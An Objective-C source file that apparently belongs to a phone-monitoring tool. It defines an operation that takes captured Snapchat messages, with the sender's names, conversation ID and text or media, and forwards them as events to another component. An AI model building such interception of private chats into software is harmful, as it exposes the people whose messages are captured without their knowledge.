//
//  SCOfflineTextChatMediaOP.m
//  MSFSP
//
//  Created by Makara on 5/27/14.
//
//

#import "SCOfflineTextChatMediaOP.h"
#import "SnapchatUtils.h"

@implementation SCOfflineTextChatMediaOP

- (id) initWithSenderUserName: (NSString *) aSenderUserName
            senderDisplayName: (NSString *) aSenderDisplayName
                       convId: (NSString *) aConvId
                         data: (id) aData {
    if ((self = [super init])) {
        mSenderUserName = [[NSString alloc] initWithString:aSenderUserName];
        mSenderDisplayName = [[NSString alloc] initWithString:aSenderDisplayName];
        mConvId = [[NSString alloc] initWithString:aConvId];
        mData = [aData retain];
    }
    return (self);
}

- (void) main {
    DLog(@"Operation to send Snapchat event ...");
    
    @try {
        if ([mData isKindOfClass:[NSString class]]) {
            NSString *text = mData;
            [SnapchatUtils sendIncomingIMEventForSenderID:mSenderUserName
                                        senderDisplayName:mSenderDisplayName
                                              messageText:text
                                                 converID:mConvId];
        } else if ([mData isKindOfClass:[NSData class]]) {
            NSData *dataFromCache = mData;
            [SnapchatUtils sendIncomingIMEventForSenderID:mSenderUserName
                                        senderDisplayName:mSenderDisplayName
                                                mediaData:dataFromCache
                                                 converID:mConvId];
        }
    }
    @catch (NSException *exception) {
        DLog(@"Snapchat offline text, photo exception: %@", exception);
    }
    @finally {
        ;
    }
    
    [NSThread sleepForTimeInterval:1.5l];
}

- (void) dealloc {
    DLog(@"dealloc operation...");
    [mSenderUserName release];
    [mSenderDisplayName release];
    [mConvId release];
    [mData release];
    [super dealloc];
}

@end
